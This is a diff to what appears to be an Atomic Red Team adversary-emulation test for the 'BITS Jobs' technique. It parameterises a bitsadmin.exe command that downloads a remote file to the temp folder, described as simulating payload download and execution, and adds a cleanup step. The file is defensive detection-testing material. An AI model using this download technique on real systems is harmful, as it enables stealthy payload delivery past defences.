@@ -3,13 +3,24 @@ display_name: BITS Jobs
 atomic_tests:
   - name: Test
     auto_generated_guid: 96173da2-c483-40a1-94a3-87355af293e1
-    description: Test
+    description: |
+      This test simulates an adversary leveraging bitsadmin.exe to download
+      and execute a payload
     supported_platforms:
       - windows
+    input_arguments:
+      remote_file:
+        description: Remote file to download
+        type: url
+        default: https://live.sysinternals.com/autoruns.exe
+      local_file:
+        description: Local file path to save downloaded file
+        type: path
+        default: '%temp%\autoruns.exe'
     executor:
       command: |
-        bitsadmin.exe /transfer /Download /priority Foreground https://live.sysinternals.com/autoruns.exe %temp%\autoruns.exe
+        bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}
         dir %temp%\autoruns.exe bitsadmin
-      cleanup_command: del %temp%\autoruns.exe >nul 2>&1
+      cleanup_command: del #{local_file} >nul 2>&1
       name: command_prompt
       elevation_required: false
